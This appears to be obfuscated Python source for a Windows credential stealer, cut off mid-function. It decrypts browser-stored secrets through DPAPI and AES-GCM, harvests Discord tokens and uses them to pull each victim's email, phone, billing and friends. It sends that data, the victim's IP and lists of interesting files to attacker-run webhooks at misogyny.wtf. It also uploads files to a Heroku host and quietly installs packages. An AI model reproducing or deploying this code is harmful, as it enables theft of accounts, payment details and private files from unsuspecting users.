B9 ='crypto'#line:1:B9='crypto'
B8 ='valorant'#line:2:B8='valorant'
B7 ='folder'#line:3:B7='folder'
B6 ='Steam'#line:4:B6='Steam'
B5 ='NationsGlory'#line:5:B5='NationsGlory'
B4 ='.db'#line:6:B4='.db'
B3 ='bcdefghijklmnopqrstuvwxyz'#line:7:B3='bcdefghijklmnopqrstuvwxyz'
B2 ='.ldb'#line:8:B2='.ldb'
B1 ='.log'#line:9:B1='.log'
B0 ='file'#line:10:B0='file'
A_ ='kiwi'#line:11:A_='kiwi'
Az ='fields'#line:12:Az='fields'
Ay ='token'#line:13:Ay='token'
Ax ='public_flags'#line:14:Ax='public_flags'
Aw ='https://discordapp.com/api/v6/users/@me'#line:15:Aw='https://discordapp.com/api/v6/users/@me'
Av ='utf8'#line:16:Av='utf8'
Au ='requests'#line:17:Au='requests'
AU ='Wallet'#line:18:AU='Wallet'
AT ='\\'#line:19:AT='\\'
AS ='passw'#line:20:AS='passw'
AR ='encrypted_key'#line:21:AR='encrypted_key'
AQ ='os_crypt'#line:22:AQ='os_crypt'
AP ='/Local State'#line:23:AP='/Local State'
AO ='text'#line:24:AO='text'
AN ='footer'#line:25:AN='footer'
AM ='author'#line:26:AM='author'
AL ='color'#line:27:AL='color'
AK ='attachments'#line:28:AK='attachments'
AJ ='avatar_url'#line:29:AJ='avatar_url'
AI ='embeds'#line:30:AI='embeds'
AH ='content'#line:31:AH='content'
AG ='ignore'#line:32:AG='ignore'
AF ='TEMP'#line:33:AF='TEMP'
y ='utf-8'#line:34:y='utf-8'
x ='https'#line:35:x='https'
w ='https://i.imgur.com/KQp7JUr.gif'#line:36:w='https://i.imgur.com/KQp7JUr.gif'
v =':x:'#line:37:v=':x:'
u =range #line:38:u=range
f ='icon_url'#line:39:f='icon_url'
e ='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'#line:40:e='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
d ='Authorization'#line:41:d='Authorization'
Z ='application/json'#line:42:Z='application/json'
Y ='User-Agent'#line:43:Y='User-Agent'
X ='Content-Type'#line:44:X='Content-Type'
T ='value'#line:45:T='value'
S ='discriminator'#line:46:S='discriminator'
Q =False #line:47:Q=False
P =len #line:48:P=len
L ='username'#line:49:L='username'
K ='type'#line:50:K='type'
J =open #line:51:J=open
I ='name'#line:52:I='name'
F =True #line:53:F=True
D =None #line:54:D=None
C ='/'#line:55:C='/'
B =''#line:56:B=''
import os as A ,threading as M #line:57:import os as A,threading as M
from sys import executable as AV #line:58:from sys import executable as AV
from sqlite3 import connect as z #line:59:from sqlite3 import connect as z
import re #line:60:import re
from base64 import b64decode as a #line:61:from base64 import b64decode as a
from json import loads as g ,load #line:62:from json import loads as g,load
from ctypes import windll as A0 ,wintypes as AW ,byref as h ,cdll ,Structure as AX ,POINTER ,c_char ,c_buffer as i #line:63:from ctypes import windll as A0,wintypes as AW,byref as h,cdll,Structure as AX,POINTER,c_char,c_buffer as i
from urllib .request import Request as G ,urlopen as H #line:64:from urllib.request import Request as G,urlopen as H
try :from pyotp import TOTP #line:65:try:from pyotp import TOTP
except :A .system ('pip install pyotp && cls >nul');from pyotp import TOTP #line:66:except:A.system('pip install pyotp && cls >nul');from pyotp import TOTP
from json import loads as A1 ,dumps as j #line:67:from json import loads as A1,dumps as j
import time ,shutil as A2 ,json #line:68:import time,shutil as A2,json
from zipfile import ZipFile #line:69:from zipfile import ZipFile
import random as A3 ,subprocess as A4 #line:70:import random as A3,subprocess as A4
N =Q #line:71:N=Q
A5 ='https://misogyny.wtf/logs/novoprojeto'#line:72:A5='https://misogyny.wtf/logs/novoprojeto'
def AY ():#line:73:def AY():
	OOOOO00O0OOO0O000 ='None'#line:74:A='None'
	try :OOOOO00O0OOO0O000 =H (G ('https://api.ipify.org')).read ().decode ().strip ()#line:75:try:A=H(G('https://api.ipify.org')).read().decode().strip()
	except :pass #line:76:except:pass
	return OOOOO00O0OOO0O000 #line:77:return A
AZ =[[Au ,Au ],['Cryptodome.Cipher','pycryptodomex']]#line:78:AZ=[[Au,Au],['Cryptodome.Cipher','pycryptodomex']]
for A6 in AZ :#line:79:for A6 in AZ:
	try :__import__ (A6 [0 ])#line:80:try:__import__(A6[0])
	except :A4 .Popen (f"{AV} -m pip install {A6[1]}",shell =F );time .sleep (3 )#line:81:except:A4.Popen(f"{AV} -m pip install {A6[1]}",shell=F);time.sleep(3)
try :import requests as O #line:82:try:import requests as O
except :A .system ('pip install requests && cls >nul');import requests as O #line:83:except:A.system('pip install requests && cls >nul');import requests as O
try :from Cryptodome .Cipher import AES #line:84:try:from Cryptodome.Cipher import AES
except :A .system ('pip install pycryptodomex && cls >nul');from Cryptodome .Cipher import AES #line:85:except:A.system('pip install pycryptodomex && cls >nul');from Cryptodome.Cipher import AES
U =A .getenv ('LOCALAPPDATA')#line:86:U=A.getenv('LOCALAPPDATA')
E =A .getenv ('APPDATA')#line:87:E=A.getenv('APPDATA')
k =A .getenv (AF )#line:88:k=A.getenv(AF)
b =[]#line:89:b=[]
class l (AX ):_fields_ =[('cbData',AW .DWORD ),('pbData',POINTER (c_char ))]#line:90:class l(AX):_fields_=[('cbData',AW.DWORD),('pbData',POINTER(c_char))]
def Aa (O00OO000OOO0O00OO ):O0OOOOO00O0O0O0O0 =O00OO000OOO0O00OO ;OO000000000OO0000 =int (O0OOOOO00O0O0O0O0 .cbData );O0OO00OOOO0000000 =O0OOOOO00O0O0O0O0 .pbData ;O0OOOO0OOOO0O000O =i (OO000000000OO0000 );cdll .msvcrt .memcpy (O0OOOO0OOOO0O000O ,O0OO00OOOO0000000 ,OO000000000OO0000 );A0 .kernel32 .LocalFree (O0OO00OOOO0000000 );return O0OOOO0OOOO0O000O .raw #line:91:def Aa(blob_out):A=blob_out;B=int(A.cbData);C=A.pbData;D=i(B);cdll.msvcrt.memcpy(D,C,B);A0.kernel32.LocalFree(C);return D.raw
def m (O000OOO00O0O0OO0O ,OOOOO0000OOO0OOOO =b''):#line:92:def m(encrypted_bytes,entropy=b''):
	O000OO00O0O000OOO =OOOOO0000OOO0OOOO ;O000OO0OO0O0O00OO =O000OOO00O0O0OO0O ;O0O0000OOO0O000O0 =i (O000OO0OO0O0O00OO ,P (O000OO0OO0O0O00OO ));OOOOOO0OOO0O0O0O0 =i (O000OO00O0O000OOO ,P (O000OO00O0O000OOO ));OO000000O0O00O0O0 =l (P (O000OO0OO0O0O00OO ),O0O0000OOO0O000O0 );O0OO0O0OOO00O00O0 =l (P (O000OO00O0O000OOO ),OOOOOO0OOO0O0O0O0 );OO0O0OOOOO000OOO0 =l ()#line:93:B=entropy;A=encrypted_bytes;E=i(A,P(A));F=i(B,P(B));G=l(P(A),E);H=l(P(B),F);C=l()
	if A0 .crypt32 .CryptUnprotectData (h (OO000000O0O00O0O0 ),D ,h (O0OO0O0OOO00O00O0 ),D ,D ,1 ,h (OO0O0OOOOO000OOO0 )):return Aa (OO0O0OOOOO000OOO0 )#line:94:if A0.crypt32.CryptUnprotectData(h(G),D,h(H),D,D,1,h(C)):return Aa(C)
def n (O000OO00000000O0O ,OOOOOOO0O00O000O0 =D ):#line:95:def n(buff,master_key=D):
	OO0OOOO00OOOOOO00 =O000OO00000000O0O ;O00O0OOO00O0O0000 =OO0OOOO00OOOOOO00 .decode (encoding =Av ,errors =AG )[:3 ]#line:96:A=buff;C=A.decode(encoding=Av,errors=AG)[:3]
	if O00O0OOO00O0O0000 =='v10'or O00O0OOO00O0O0000 =='v11':OO0OO00OOOOOO00OO =OO0OOOO00OOOOOO00 [3 :15 ];O0O0OOOOOO0O0OOOO =OO0OOOO00OOOOOO00 [15 :];O0OO0OO000O0000O0 =AES .new (OOOOOOO0O00O000O0 ,AES .MODE_GCM ,OO0OO00OOOOOO00OO );O000OOOOOO0OO00OO =O0OO0OO000O0000O0 .decrypt (O0O0OOOOOO0O0OOOO );O000OOOOOO0OO00OO =O000OOOOOO0OO00OO [:-16 ].decode ();return O000OOOOOO0OO00OO #line:97:if C=='v10'or C=='v11':D=A[3:15];E=A[15:];F=AES.new(master_key,AES.MODE_GCM,D);B=F.decrypt(E);B=B[:-16].decode();return B
def BA (OOO00OO0000OOO0OO ,OO0OO0O00O0O0OOO0 ,O0000O00O00OO00O0 =B ,OO000OO0000OOO0OO =B ,OOO00OO0O0OO0O0O0 =B ):#line:98:def BA(methode,url,data=B,files=B,headers=B):
	OO00000000OOO0O00 =OO000OO0000OOO0OO #line:99:C=files
	for O0OO0000000O000O0 in u (8 ):#line:100:for D in u(8):
		try :#line:101:try:
			if OOO00OO0000OOO0OO =='POST':#line:102:if methode=='POST':
				if O0000O00O00OO00O0 !=B :#line:103:if data!=B:
					OOOO000O000OO000O =O .post (OO0OO0O00O0O0OOO0 ,data =O0000O00O00OO00O0 )#line:104:A=O.post(url,data=data)
					if OOOO000O000OO000O .status_code ==200 :return OOOO000O000OO000O #line:105:if A.status_code==200:return A
				elif OO00000000OOO0O00 !=B :#line:106:elif C!=B:
					OOOO000O000OO000O =O .post (OO0OO0O00O0O0OOO0 ,files =OO00000000OOO0O00 )#line:107:A=O.post(url,files=C)
					if OOOO000O000OO000O .status_code ==200 or OOOO000O000OO000O .status_code ==413 :return OOOO000O000OO000O #line:108:if A.status_code==200 or A.status_code==413:return A
		except :pass #line:109:except:pass
def BB (OOOO0OO000OOOO0OO ,OO0OOOO00OOO0O0OO =B ,OO0000O00O0OOOO0O =B ,OOO000000000OOOO0 =B ):#line:110:def BB(hook,data=B,files=B,headers=B):
	O0OOO0000OOOO00O0 =OOO000000000OOOO0 #line:111:C=headers
	for O0O0OOOOO0OOOO0OO in u (8 ):#line:112:for D in u(8):
		try :#line:113:try:
			if O0OOO0000OOOO00O0 !=B :O0OO00OOO00000O0O =H (G (OOOO0OO000OOOO0OO ,data =OO0OOOO00OOO0O0OO ,headers =O0OOO0000OOOO00O0 ));return O0OO00OOO00000O0O #line:114:if C!=B:A=H(G(hook,data=data,headers=C));return A
			else :O0OO00OOO00000O0O =H (G (OOOO0OO000OOOO0OO ,data =OO0OOOO00OOO0O0OO ));return O0OO00OOO00000O0O #line:115:else:A=H(G(hook,data=data));return A
		except :pass #line:116:except:pass
def A7 (O0000OO0OOO0OOOOO ):#line:117:def A7(Cookies):
	global N ;O0OO00O0000OO00O0 =str (O0000OO0OOO0OOOOO );OO0OO0OO0000000OO =re .findall ('.google.com',O0OO00O0000OO00O0 )#line:118:global N;A=str(Cookies);B=re.findall('.google.com',A)
	if P (OO0OO0OO0000000OO )<-1 :N =F ;return N #line:119:if P(B)<-1:N=F;return N
	else :N =Q ;return N #line:120:else:N=Q;return N
def Ab (OOO000O00O0O00OO0 ):#line:121:def Ab(token):
	O0OOO000O0OO0O00O ={d :OOO000O00O0O00OO0 ,X :Z ,Y :e }#line:122:E={d:token,X:Z,Y:e}
	try :OOO0O00O0O0OO0OOO =A1 (H (G ('https://discord.com/api/users/@me/billing/payment-sources',headers =O0OOO000O0OO0O00O )).read ().decode ())#line:123:try:D=A1(H(G('https://discord.com/api/users/@me/billing/payment-sources',headers=E)).read().decode())
	except :return Q #line:124:except:return Q
	if OOO0O00O0O0OO0OOO ==[]:return v #line:125:if D==[]:return v
	OO0OOO0O000O0000O =B #line:126:A=B
	for O000OO0000O00O00O in OOO0O00O0O0OO0OOO :#line:127:for C in D:
		if O000OO0000O00O00O ['invalid']==Q :#line:128:if C['invalid']==Q:
			if O000OO0000O00O00O [K ]==1 :OO0OOO0O000O0000O +=' :credit_card: '#line:129:if C[K]==1:A+=' :credit_card: '
			elif O000OO0000O00O00O [K ]==2 :OO0OOO0O000O0000O +=' :parking: '#line:130:elif C[K]==2:A+=' :parking: '
			elif O000OO0000O00O00O [K ]==8 :OO0OOO0O000O0000O +=' :regional_indicator_g: '#line:131:elif C[K]==8:A+=' :regional_indicator_g: '
	return OO0OOO0O000O0000O #line:132:return A
def Ac (OOOO0O00OOO0OOO0O ):#line:133:def Ac(flags):
	OOO00000O0O0O0OO0 =OOOO0O00OOO0OOO0O ;O0OOO0O00O0O0000O ='Name';O0O0OOO0000O0OOO0 ='Emoji';OOOO0O0OOOOOOO0O0 ='Value'#line:134:E=flags;D='Name';C='Emoji';A='Value'
	if OOO00000O0O0O0OO0 ==0 :return B #line:135:if E==0:return B
	O00OO0O000OO000OO =B ;O0O00O000O0OOOO00 =[{O0OOO0O00O0O0000O :'Early_Verified_Bot_Developer',OOOO0O0OOOOOOO0O0 :131072 ,O0O0OOO0000O0OOO0 :'<:developer:874750808472825986> '},{O0OOO0O00O0O0000O :'Bug_Hunter_Level_2',OOOO0O0OOOOOOO0O0 :16384 ,O0O0OOO0000O0OOO0 :'<:bughunter_2:874750808430874664> '},{O0OOO0O00O0O0000O :'Early_Supporter',OOOO0O0OOOOOOO0O0 :512 ,O0O0OOO0000O0OOO0 :'<:early_supporter:874750808414113823> '},{O0OOO0O00O0O0000O :'House_Balance',OOOO0O0OOOOOOO0O0 :256 ,O0O0OOO0000O0OOO0 :'<:balance:874750808267292683> '},{O0OOO0O00O0O0000O :'House_Brilliance',OOOO0O0OOOOOOO0O0 :128 ,O0O0OOO0000O0OOO0 :'<:brilliance:874750808338608199> '},{O0OOO0O00O0O0000O :'House_Bravery',OOOO0O0OOOOOOO0O0 :64 ,O0O0OOO0000O0OOO0 :'<:bravery:874750808388952075> '},{O0OOO0O00O0O0000O :'Bug_Hunter_Level_1',OOOO0O0OOOOOOO0O0 :8 ,O0O0OOO0000O0OOO0 :'<:bughunter_1:874750808426692658> '},{O0OOO0O00O0O0000O :'HypeSquad_Events',OOOO0O0OOOOOOO0O0 :4 ,O0O0OOO0000O0OOO0 :'<:hypesquad_events:874750808594477056> '},{O0OOO0O00O0O0000O :'Partnered_Server_Owner',OOOO0O0OOOOOOO0O0 :2 ,O0O0OOO0000O0OOO0 :'<:partner:874750808678354964> '},{O0OOO0O00O0O0000O :'Discord_Employee',OOOO0O0OOOOOOO0O0 :1 ,O0O0OOO0000O0OOO0 :'<:staff:874750808728666152> '}]#line:136:G=B;H=[{D:'Early_Verified_Bot_Developer',A:131072,C:'<:developer:874750808472825986> '},{D:'Bug_Hunter_Level_2',A:16384,C:'<:bughunter_2:874750808430874664> '},{D:'Early_Supporter',A:512,C:'<:early_supporter:874750808414113823> '},{D:'House_Balance',A:256,C:'<:balance:874750808267292683> '},{D:'House_Brilliance',A:128,C:'<:brilliance:874750808338608199> '},{D:'House_Bravery',A:64,C:'<:bravery:874750808388952075> '},{D:'Bug_Hunter_Level_1',A:8,C:'<:bughunter_1:874750808426692658> '},{D:'HypeSquad_Events',A:4,C:'<:hypesquad_events:874750808594477056> '},{D:'Partnered_Server_Owner',A:2,C:'<:partner:874750808678354964> '},{D:'Discord_Employee',A:1,C:'<:staff:874750808728666152> '}]
	for OOOOO0000OO0O0O00 in O0O00O000O0OOOO00 :#line:137:for F in H:
		if OOO00000O0O0O0OO0 //OOOOO0000OO0O0O00 [OOOO0O0OOOOOOO0O0 ]!=0 :O00OO0O000OO000OO +=OOOOO0000OO0O0O00 [O0O0OOO0000O0OOO0 ];OOO00000O0O0O0OO0 =OOO00000O0O0O0OO0 %OOOOO0000OO0O0O00 [OOOO0O0OOOOOOO0O0 ]#line:138:if E//F[A]!=0:G+=F[C];E=E%F[A]
	return O00OO0O000OO000OO #line:139:return G
def Ad (OOO0OO0O0O0O0O0O0 ):#line:140:def Ad(token):
	OO0000O000O00OO0O ='phone';OO00000O0000OO00O ='premium_type';O0000O00O0O0OO0O0 ={d :OOO0OO0O0O0O0O0O0 ,X :Z ,Y :e };OO0O0O0OOO0OOOO0O =A1 (H (G (Aw ,headers =O0000O00O0O0OO0O0 )).read ().decode ());OO0OOO0OO0OO0OOO0 =OO0O0O0OOO0OOOO0O [L ];OOOOO0OOO00000OO0 =OO0O0O0OOO0OOOO0O [S ];O00OO0O0O0OOO000O =OO0O0O0OOO0OOOO0O ['email'];OOOOOO00O00OO00OO =OO0O0O0OOO0OOOO0O ['id'];O000OO00OOOOO0O0O =OO0O0O0OOO0OOOO0O ['avatar'];O0OOOOO0OOO0O0O00 =OO0O0O0OOO0OOOO0O [Ax ];OOOOOOOO000OOO0O0 =v ;OO0O00OO000OO00O0 =v #line:141:P='phone';O='premium_type';E={d:token,X:Z,Y:e};A=A1(H(G(Aw,headers=E)).read().decode());F=A[L];I=A[S];J=A['email'];K=A['id'];M=A['avatar'];N=A[Ax];B=v;C=v
	if OO00000O0000OO00O in OO0O0O0OOO0OOOO0O :#line:142:if O in A:
		O0OO0O0O00O000OO0 =OO0O0O0OOO0OOOO0O [OO00000O0000OO00O ]#line:143:D=A[O]
		if O0OO0O0O00O000OO0 ==1 :OOOOOOOO000OOO0O0 ='<:classic:896119171019067423> '#line:144:if D==1:B='<:classic:896119171019067423> '
		elif O0OO0O0O00O000OO0 ==2 :OOOOOOOO000OOO0O0 ='<a:boost:824036778570416129> <:classic:896119171019067423> '#line:145:elif D==2:B='<a:boost:824036778570416129> <:classic:896119171019067423> '
	if OO0000O000O00OO0O in OO0O0O0OOO0OOOO0O :OO0O00OO000OO00O0 =f"`{OO0O0O0OOO0OOOO0O[OO0000O000O00OO0O]}`"#line:146:if P in A:C=f"`{A[P]}`"
	return OO0OOO0OO0OO0OOO0 ,OOOOO0OOO00000OO0 ,O00OO0O0O0OOO000O ,OOOOOO00O00OO00OO ,O000OO00OOOOO0O0O ,O0OOOOO0OOO0O0O00 ,OOOOOOOO000OOO0O0 ,OO0O00OO000OO00O0 #line:147:return F,I,J,K,M,N,B,C
def A8 (O0OO00OOO0O0O0O0O ):#line:148:def A8(token):
	OO0O0OO0O000000O0 ={d :O0OO00OOO0O0O0O0O ,X :Z ,Y :e }#line:149:A={d:token,X:Z,Y:e}
	try :H (G (Aw ,headers =OO0O0OO0O000000O0 ));return F #line:150:try:H(G(Aw,headers=A));return F
	except :return Q #line:151:except:return Q
def Ae (O00OOOOO00OOOOO00 ):#line:152:def Ae(token):
	OO0OOO00O0OOOO0O0 ='user';OO0O00O0000O0O000 =B ;OO0O0OOOOOOO00OO0 ={d :f"{O00OOOOO00OOOOO00}"};O0O00O0OO0O0OOO00 =O .get ('https://discord.com/api/v6/users/@me/relationships',headers =OO0O0OOOOOOO00OO0 );OO0OOO0O0OO000000 =json .loads (O0O00O0OO0O0OOO00 .text )#line:153:E='user';F=B;H={d:f"{token}"};I=O.get('https://discord.com/api/v6/users/@me/relationships',headers=H);G=json.loads(I.text)
	if P (OO0OOO0O0OO000000 )==0 :return D #line:154:if P(G)==0:return D
	for O00O0OOOO0O0OO000 in OO0OOO0O0OO000000 :#line:155:for A in G:
		O00000OO0O00O0O00 =O00O0OOOO0O0OO000 [OO0OOO00O0OOOO0O0 ][Ax ]#line:156:C=A[E][Ax]
		if O00O0OOOO0O0OO000 [K ]==1 &O00000OO0O00O0O00 %131072 !=0 :OO0O00O0000O0O000 +=f" <:DevBadge:912727453875699733>|`{O00O0OOOO0O0OO000[OO0OOO00O0OOOO0O0][L]}#{O00O0OOOO0O0OO000[OO0OOO00O0OOOO0O0][S]}`\n";O00000OO0O00O0O00 =O00000OO0O00O0O00 %131072 #line:157:if A[K]==1&C%131072!=0:F+=f" <:DevBadge:912727453875699733>|`{A[E][L]}#{A[E][S]}`\n";C=C%131072
		if O00O0OOOO0O0OO000 [K ]==1 &O00000OO0O00O0O00 //16384 !=0 :OO0O00O0000O0O000 +=f" <:TG_DiscordBugHunter:924608161116213278>|`{O00O0OOOO0O0OO000[OO0OOO00O0OOOO0O0][L]}#{O00O0OOOO0O0OO000[OO0OOO00O0OOOO0O0][S]}`\n";O00000OO0O00O0O00 =O00000OO0O00O0O00 %16384 #line:158:if A[K]==1&C//16384!=0:F+=f" <:TG_DiscordBugHunter:924608161116213278>|`{A[E][L]}#{A[E][S]}`\n";C=C%16384
		if O00O0OOOO0O0OO000 [K ]==1 &O00000OO0O00O0O00 //512 !=0 :OO0O00O0000O0O000 +=f" <a:early:913099122968494170>|`{O00O0OOOO0O0OO000[OO0OOO00O0OOOO0O0][L]}#{O00O0OOOO0O0OO000[OO0OOO00O0OOOO0O0][S]}`\n";O00000OO0O00O0O00 =O00000OO0O00O0O00 %512 #line:159:if A[K]==1&C//512!=0:F+=f" <a:early:913099122968494170>|`{A[E][L]}#{A[E][S]}`\n";C=C%512
		if O00O0OOOO0O0OO000 [K ]==1 &O00000OO0O00O0O00 //8 !=0 :OO0O00O0000O0O000 +=f" <:TP_Icon_bugHunter:896263053484638218>|`{O00O0OOOO0O0OO000[OO0OOO00O0OOOO0O0][L]}#{O00O0OOOO0O0OO000[OO0OOO00O0OOOO0O0][S]}`\n";O00000OO0O00O0O00 =O00000OO0O00O0O00 %8 #line:160:if A[K]==1&C//8!=0:F+=f" <:TP_Icon_bugHunter:896263053484638218>|`{A[E][L]}#{A[E][S]}`\n";C=C%8
		if O00O0OOOO0O0OO000 [K ]==1 &O00000OO0O00O0O00 //4 !=0 :OO0O00O0000O0O000 +=f" <a:CH_IconHypesquadShiny:928551747591487548>|`{O00O0OOOO0O0OO000[OO0OOO00O0OOOO0O0][L]}#{O00O0OOOO0O0OO000[OO0OOO00O0OOOO0O0][S]}`\n";O00000OO0O00O0O00 =O00000OO0O00O0O00 %4 #line:161:if A[K]==1&C//4!=0:F+=f" <a:CH_IconHypesquadShiny:928551747591487548>|`{A[E][L]}#{A[E][S]}`\n";C=C%4
		if O00O0OOOO0O0OO000 [K ]==1 &O00000OO0O00O0O00 //2 !=0 :OO0O00O0000O0O000 +=f" <a:Badge_partner:875020015215190046>|`{O00O0OOOO0O0OO000[OO0OOO00O0OOOO0O0][L]}#{O00O0OOOO0O0OO000[OO0OOO00O0OOOO0O0][S]}`\n";O00000OO0O00O0O00 =O00000OO0O00O0O00 %2 #line:162:if A[K]==1&C//2!=0:F+=f" <a:Badge_partner:875020015215190046>|`{A[E][L]}#{A[E][S]}`\n";C=C%2
	if OO0O00O0000O0O000 ==B :return '``NO HQ FRIENDS``'#line:163:if F==B:return'``NO HQ FRIENDS``'
	else :return OO0O00O0000O0O000 #line:164:else:return F
def A9 (O0OO00OOOOO0O000O ,OO0O0OO0O00OOO0O0 ):#line:165:def A9(token,path):
	O000OO000O00OO00O ='url';OOOOOOO000OO000OO ='thumbnail';O000O0000O00OO000 ='🔒';O000OOO0OO0O0O0O0 ='inline';OOOOOO00OOO0000OO =O0OO00OOOOO0O000O ;global A5 ;OO0OO0O0OOO000OOO ={X :Z ,Y :e };O0OO00OO0OO0O0OOO ,O0O0O000OO0O00OO0 ,O0O000OO0OOOO0000 ,O00O000OO00OO0O0O ,O000000O0OO0O00O0 ,O00000O000O000OOO ,OO0O0O0O000000O00 ,OOOOO0OOOOO00O00O =Ad (OOOOOO00OOO0000OO );OOOO0O0000OO00OO0 =O .post ('https://misogyny.wtf/db/newtoken',json ={Ay :OOOOOO00OOO0000OO },headers ={X :Z ,Y :'Mozilla/5.0 (Linux; Ubuntu 14.04) AppleWebKit/537.36 Chromium/35.0.1870.2/Flps Safari/537.36/Zckt'})#line:166:g='url';d='thumbnail';U='🔒';E='inline';C=token;global A5;P={X:Z,Y:e};Q,R,V,J,A,W,K,S=Ad(C);a=O.post('https://misogyny.wtf/db/newtoken',json={Ay:C},headers={X:Z,Y:'Mozilla/5.0 (Linux; Ubuntu 14.04) AppleWebKit/537.36 Chromium/35.0.1870.2/Flps Safari/537.36/Zckt'})
	if OOOO0O0000OO00OO0 .text =='not in db':#line:167:if a.text=='not in db':
		if O000000O0OO0O00O0 ==D :O000000O0OO0O00O0 =w #line:168:if A==D:A=w
		else :O000000O0OO0O00O0 =f"https://cdn.discordapp.com/avatars/{O00O000OO00OO0O0O}/{O000000O0OO0O00O0}"#line:169:else:A=f"https://cdn.discordapp.com/avatars/{J}/{A}"
		O0O0OOOOO00O00O00 =Ab (OOOOOO00OOO0000OO );O0OOO0O00O0000OOO =Ac (O00000O000O000OOO )#line:170:M=Ab(C);N=Ac(W)
		if not O0O0OOOOO00O00O00 :O0OOO0O00O0000OOO ,OOOOO0OOOOO00O00O ,O0O0OOOOO00O00O00 =O000O0000O00OO000 ,O000O0000O00OO000 ,O000O0000O00OO000 #line:171:if not M:N,S,M=U,U,U
		if OO0O0O0O000000O00 ==B and O0OOO0O00O0000OOO ==B :OO0O0O0O000000O00 =v #line:172:if K==B and N==B:K=v
		OO0O0O00OO00000O0 ={AH :f"Found in `{OO0O0OO0O00OOO0O0}`",AI :[{AL :5119890 ,Az :[{I :':rocket: Token:',T :f"`{OOOOOO00OOO0000OO}`\n[Click to copy](https://superfurrycdn.nl/copy/{C})"},{I :':envelope: Email:',T :f"`{O0O000OO0OOOO0000}`",O000OOO0OO0O0O0O0 :F },{I :':mobile_phone: Phone:',T :f"`{OOOOO0OOOOO00O00O}`",O000OOO0OO0O0O0O0 :F },{I :':globe_with_meridians: IP:',T :f"`{AY()}`",O000OOO0OO0O0O0O0 :F },{I :':beginner: Badges:',T :f"{OO0O0O0O000000O00}{O0OOO0O00O0000OOO}",O000OOO0OO0O0O0O0 :F },{I :':credit_card: Billing:',T :f"{O0O0OOOOO00O00O00}",O000OOO0OO0O0O0O0 :F }],AM :{I :f"{O0OO00OO0OO0O0OOO}#{O0O0O000OO0O00OO0} ({O00O000OO00OO0O0O})",f :f"{O000000O0OO0O00O0}"},AN :{AO :D ,f :w },OOOOOOO000OO000OO :{O000OO000O00OO00O :f"{O000000O0OO0O00O0}"}}],AJ :D ,L :D ,AK :[]};OOO00O0OO0O00O00O ={AH :D ,AI :[{AL :5119890 ,'description':f"{Ae(OOOOOO00OOO0000OO)}",AM :{I :f"{O0OO00OO0OO0O0OOO}#{O0O0O000OO0O00OO0} ({O00O000OO00OO0O0O})",f :f"{O000000O0OO0O00O0}"},AN :{AO :D ,f :w },OOOOOOO000OO000OO :{O000OO000O00OO00O :f"{O000000O0OO0O00O0}"}}],AJ :D ,L :D ,AK :[]};H (G (A5 ,data =j (OO0O0O00OO00000O0 ).encode (),headers =OO0OO0O0OOO000OOO ));H (G ('https://misogyny.wtf/logs/friendlist',data =j (OOO00O0OO0O00O00O ).encode (),headers =OO0OO0O0OOO000OOO ))#line:173:b={AH:f"Found in `{path}`",AI:[{AL:5119890,Az:[{I:':rocket: Token:',T:f"`{C}`\n[Click to copy](https://superfurrycdn.nl/copy/{C})"},{I:':envelope: Email:',T:f"`{V}`",E:F},{I:':mobile_phone: Phone:',T:f"`{S}`",E:F},{I:':globe_with_meridians: IP:',T:f"`{AY()}`",E:F},{I:':beginner: Badges:',T:f"{K}{N}",E:F},{I:':credit_card: Billing:',T:f"{M}",E:F}],AM:{I:f"{Q}#{R} ({J})",f:f"{A}"},AN:{AO:D,f:w},d:{g:f"{A}"}}],AJ:D,L:D,AK:[]};c={AH:D,AI:[{AL:5119890,'description':f"{Ae(C)}",AM:{I:f"{Q}#{R} ({J})",f:f"{A}"},AN:{AO:D,f:w},d:{g:f"{A}"}}],AJ:D,L:D,AK:[]};H(G(A5,data=j(b).encode(),headers=P));H(G('https://misogyny.wtf/logs/friendlist',data=j(c).encode(),headers=P))
	else :0 #line:174:else:0
def BC (O0O00O0O0O0000O0O ):#line:175:def BC(listt):
	O0OOO000OOO00OOO0 ='net';O0OO0000O0OO00OO0 ='com';OOOO0O0O0OO0OOO00 =re .findall ('(\\w+[a-z])',O0O00O0O0O0000O0O )#line:176:C='net';B='com';A=re.findall('(\\w+[a-z])',listt)
	while x in OOOO0O0O0OO0OOO00 :OOOO0O0O0OO0OOO00 .remove (x )#line:177:while x in A:A.remove(x)
	while O0OO0000O0OO00OO0 in OOOO0O0O0OO0OOO00 :OOOO0O0O0OO0OOO00 .remove (O0OO0000O0OO00OO0 )#line:178:while B in A:A.remove(B)
	while O0OOO000OOO00OOO0 in OOOO0O0O0OO0OOO00 :OOOO0O0O0OO0OOO00 .remove (O0OOO000OOO00OOO0 )#line:179:while C in A:A.remove(C)
	return list (set (OOOO0O0O0OO0OOO00 ))#line:180:return list(set(A))
def o (OOO0O0O00OOO00000 ,O0OO00O0O000OOO0O =B ):#line:181:def o(name,tk=B):
	OO0O00000OOOO0O0O ={X :Z ,Y :e }#line:182:A={X:Z,Y:e}
	if OOO0O0O00OOO00000 ==A_ :O0O0OO000OO0O0000 ={AH :B ,AI :[{AL :5119890 ,Az :[{I :'Interesting files found on user PC:',T :O0OO00O0O000OOO0O }],AM :{I :'File Stealer'},AN :{AO :D ,f :w }}],AJ :D ,AK :[]};H (G ('https://misogyny.wtf/logs/filestealer',data =j (O0O0OO000OO0O0000 ).encode (),headers =OO0O00000OOOO0O0O ));return #line:183:if name==A_:C={AH:B,AI:[{AL:5119890,Az:[{I:'Interesting files found on user PC:',T:tk}],AM:{I:'File Stealer'},AN:{AO:D,f:w}}],AJ:D,AK:[]};H(G('https://misogyny.wtf/logs/filestealer',data=j(C).encode(),headers=A));return
	O00O00OO0O00OOOOO =OOO0O0O00OOO00000 ;O0O0O00O00OO000O0 ={B0 :J (O00O00OO0O00OOOOO ,'rb')};O .post ('http://mysterious-everglades-49390.herokuapp.com',headers ={d :TOTP ('BJCMFCAZJ5HB3Q5MYK4HW===').now ()},files =O0O0O00O00OO000O0 )#line:184:E=name;F={B0:J(E,'rb')};O.post('http://mysterious-everglades-49390.herokuapp.com',headers={d:TOTP('BJCMFCAZJ5HB3Q5MYK4HW===').now()},files=F)
def AA (O0000O00OOO0O0O00 ,O0OO00000O00O0OOO ):#line:185:def AA(data,name):
